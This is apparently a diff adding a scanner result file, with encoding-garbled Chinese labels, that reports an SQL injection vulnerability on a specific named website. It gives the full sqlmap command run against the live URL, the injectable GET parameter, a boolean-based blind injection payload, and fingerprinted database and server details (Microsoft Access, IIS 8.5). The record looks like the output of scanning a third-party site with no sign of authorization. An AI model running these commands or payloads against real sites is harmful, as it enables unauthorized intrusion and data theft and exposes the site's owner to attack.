@@ -1,0 +1,15 @@
+
+                             ã€ SQL æ³¨å…¥æ¼æ´ ã€‘ 
+ã€ æ¼æ´ç½‘å€ ã€‘ : https://www.ywkt.com/default.asp?page=617&BigClassName=&SmallClassName=&SpecialName=&Action=&keyword=
+ã€ æ‰§è¡Œå‘½ä»¤ ã€‘ : F:\CODE\¸öÈË×÷Æ·Ô´´úÂë\¸öÈËÂ©É¨ÏîÄ¿\Langzi_°²È«Ñ²º½0.95\lib\python.exe F:\CODE\¸öÈË×÷Æ·Ô´´úÂë\¸öÈËÂ©É¨ÏîÄ¿\Langzi_°²È«Ñ²º½0.95\lib\sqlmap\sqlmap.py -u https://www.ywkt.com/default.asp?page=617^&BigClassName=^&SmallClassName=^&SpecialName=^&Action=^&keyword= --batch --thread=10 --random-agent
+
+æ³¨å…¥å‚æ•°(æ–¹å¼) : SpecialName (GET)
+    æ³¨å…¥æ–¹å¼ : boolean-based blind
+    æ³¨å…¥æ ‡é¢˜ : AND boolean-based blind - WHERE or HAVING clause
+    æ³¨å…¥æ”»å‡» : page=617&BigClassName=&SmallClassName=&SpecialName=' AND 8247=8247 AND 'GIio'='GIio&Action=&keyword=
+
+æ•°æ®åº“ç±»å‹ : Microsoft Access
+æœåŠ¡å™¨ç‰ˆæœ¬ : Windows 8.1 or 2012 R2
+æœåŠ¡å™¨è¯­è¨€ : ASP.NET, Microsoft IIS 8.5, ASP
+æ•°æ®åº“ç‰ˆæœ¬ : Microsoft Access
+
